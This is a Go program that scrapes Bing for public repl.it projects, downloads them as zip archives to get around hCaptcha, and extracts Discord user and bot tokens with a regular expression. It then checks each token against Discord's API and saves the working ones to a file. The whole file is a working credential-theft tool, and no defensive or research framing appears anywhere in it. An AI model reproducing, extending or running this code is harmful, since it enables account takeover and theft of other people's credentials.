package main

import (
	"archive/zip"
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"

	"github.com/gookit/color"
)

func main() {
	var (
		pageAmount  int
		searchQuery string
		urls        []string
	)

	// ** Create a folder where all of the stuff will be dumped to ** //
	os.MkdirAll(dumpFolder, 0755)
	os.MkdirAll(zipFolder, 0755)

	// ** Read input ** //
	scanner := bufio.NewScanner(os.Stdin)

	fmt.Println("Enter your search query: ")

	for i := 0; i < 2; i++ {
		scanner.Scan()
		switch i {
		case 0:
			searchQuery = scanner.Text()
			fmt.Println("Enter the amount of pages you want to scrape: ")
		case 1:
			i, _ := strconv.Atoi(scanner.Text())
			pageAmount = i
		}
	}

	// ** scrape repl.it URLS off bing.com ** //
	for i := 0; i < pageAmount; i++ {
		res, err := http.Get(fmt.Sprintf(scrapeURL, url.QueryEscape(searchQuery), i))
		if err != nil {
			return
		}
		resBody, _ := ioutil.ReadAll(res.Body)

		for _, url := range regexMatch.FindAllString(string(resBody), -1) {
			if FindInSlice(urls, url) {
				continue
			}
			urls = append(urls, url)
		}
	}

	// ** Download the zip file of each repl.it URL to bypass hCaptcha ** //
	for fileName, url := range urls {

		fmt.Printf("Scraping %s: ", url)

		File, err := downloadZIP(url, fmt.Sprint(fileName))
		if err != nil {
			red.Print(err.Error() + "\n")
			continue
		}

		green.Print("Sucessfully fetched\n")

		unzip(File.Name())
	}

	// ** Scrape contents from files ** //
	scrapeTokens()

	// ** clean file data ** //
	os.RemoveAll(dumpFolder)
	os.RemoveAll(zipFolder)

	if len(validTokens) > 0 {
		file, err := os.Create("Tokens.txt")
		if err != nil {
			return
		}
		defer file.Close()
		for _, line := range validTokens {
			fmt.Fprintln(file, line)
		}
		exec.Command("notepad", currentDir+"\\Tokens.txt").Run()
		return
	}
	fmt.Printf("Could not find any tokens using the query %s.\n", searchQuery)
}

func downloadZIP(url string, name string) (File *os.File, err error) {
	var (
		fileData []byte
		Response *http.Response
	)

	Response, err = http.Get(url + ".zip")
	fileData, err = ioutil.ReadAll(Response.Body)
	if string(fileData) == "{\"message\":\"Repl not found\",\"name\":\"NotFoundError\",\"status\":404}" {
		return nil, fmt.Errorf("project has been deleted")
	}

	File, err = os.Create(fmt.Sprintf("%s\\%s.zip", zipFolder, name))

	err = ioutil.WriteFile(fmt.Sprintf("%s\\%s.zip", zipFolder, name), fileData, 0666)
	if err != nil {
		return nil, err
	}

	defer File.Close()

	return File, nil
}

func FindInSlice(slice []string, item string) bool {
	for _, i := range slice {
		if i == item {
			return true
		}
	}
	return false
}

func getTokens(data string) {
	for _, token := range tokenRegex.FindStringSubmatch(data) {
		validToken, isBot := validateToken(token, false)

		switch {
		case !validToken || FindInSlice(validTokens, token):
			continue
		case isBot:
			validTokens = append(validTokens, "Bot "+token)
			continue
		}

		validTokens = append(validTokens, token)
	}
}

func scrapeTokens() {
	filepath.Walk(dumpFolder, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		fileBytes, err := ioutil.ReadFile(path)
		if err != nil {
			return err
		}

		getTokens(string(fileBytes))
		getTokens(info.Name())

		return nil
	})
}

func unzip(source string) error {
	zip, err := zip.OpenReader(source)
	if err != nil {
		return err
	}
	defer zip.Close()

	for _, file := range zip.File {
		if file.Mode().IsDir() {
			continue
		}

		fileDir := path.Dir(dumpFolder + "\\" + file.Name)

		os.MkdirAll(fileDir, os.ModeDir)

		srcFile, err := file.Open()
		if err != nil {
			return err
		}
		defer srcFile.Close()

		targetFile, err := os.Create(dumpFolder + "\\" + file.Name)
		if err != nil {
			return err
		}
		defer targetFile.Close()

		targetFile.ReadFrom(srcFile)
	}
	return nil
}

func validateToken(token string, bot bool) (bool, bool) {
	request, _ := http.NewRequest("GET", "https://discordapp.com/api/v7/users/@me", nil)
	request.Header.Set("Authorization", token)

	Response, err := client.Do(request)
	if err != nil {
		return false, false
	}

	if Response.StatusCode != 200 {
		if !strings.Contains(token, "Bot") {
			return validateToken("Bot "+token, true)
		}
		return false, false
	}

	return true, bot
}

var (
	// ** Https stuff ** //
	client    = &http.Client{}
	scrapeURL = "https://www.bing.com/search?q=%s+site:repl.it&first=%d&FORM=PERE"

	// ** Colours ** //
	green = color.FgGreen
	red   = color.FgRed
	// ** Scrape info ** //
	regexMatch  = regexp.MustCompile(`https://repl\.it/@\w+/\w+`)
	tokenRegex  = regexp.MustCompile(`[A-Za-z0-9-_]{24}[.][A-Za-z0-90-_]{6}[.][A-Za-z0-9-_]{27}|mfa\.[A-Za-z0-9-_]{84}`)
	validTokens []string

	// ** File paths ** //
	currentDir, _ = os.Getwd()
	dumpFolder    = currentDir + "\\dump"
	zipFolder     = currentDir + "\\zips"
)
